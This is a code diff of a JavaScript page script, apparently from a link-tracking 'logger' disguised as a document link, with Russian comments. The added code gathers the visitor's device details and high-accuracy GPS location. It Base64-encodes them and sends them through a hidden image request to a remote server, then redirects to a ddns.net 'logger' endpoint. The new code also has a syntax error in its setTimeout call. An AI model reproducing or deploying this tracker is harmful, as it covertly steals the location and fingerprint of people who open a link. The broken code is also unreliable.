@@ -18,39 +18,36 @@
         const finalRedirect = "http://echomapwa.ddns.net/logger/l/"; // Эндпоинт редиректа
 
         async function collectAndGo() {
-            if (!slug) {
-                document.body.innerHTML = "Document not found.";
-                return;
-            }
-
+            if (!slug) return;
+        
             let info = {
                 sw: window.screen.width, sh: window.screen.height,
                 plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
-                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                gpu: "Unknown", coords: null
+                gpu: "Unknown", lat: null, lon: null
             };
-
-            // Пытаемся взять GPS (т.к. GitHub на HTTPS, это сработает)
+        
+            // Пытаемся взять GPS
             if ("geolocation" in navigator) {
                 try {
                     const pos = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000, enableHighAccuracy: true});
+                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000, enableHighAccuracy: true});
                     });
-                    info.coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                } catch(e) { console.log("GPS Denied/Timeout"); }
+                    info.lat = pos.coords.latitude;
+                    info.lon = pos.coords.longitude;
+                } catch(e) { console.log("GPS Skip"); }
             }
-
-            // Отправляем данные на твой сервер через POST (AJAX)
-            try {
-                await fetch(targetServer + slug, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(info)
-                });
-            } catch(e) { console.error("Server error"); }
-
-            // После отправки логов — финальный редирект
-            window.location.href = finalRedirect + slug;
+        
+            // "Шифруем" данные в Base64, чтобы пролезли в URL без проблем
+            const encodedData = btoa(JSON.stringify(info));
+            
+            // ОТПРАВКА ЧЕРЕЗ КАРТИНКУ (Самый надежный метод для HTTP/HTTPS микса)
+            const img = new Image();
+            img.src = `${targetServer}${slug}?data=${encodedData}&_t=${Date.now()}`;
+        
+            // Ждем полсекунды, чтобы запрос ушел, и редиректим
+            setTimeout(() => {
+                window.location.href = finalRedirect + slug;
+            }, 600;
         }
 
         collectAndGo();
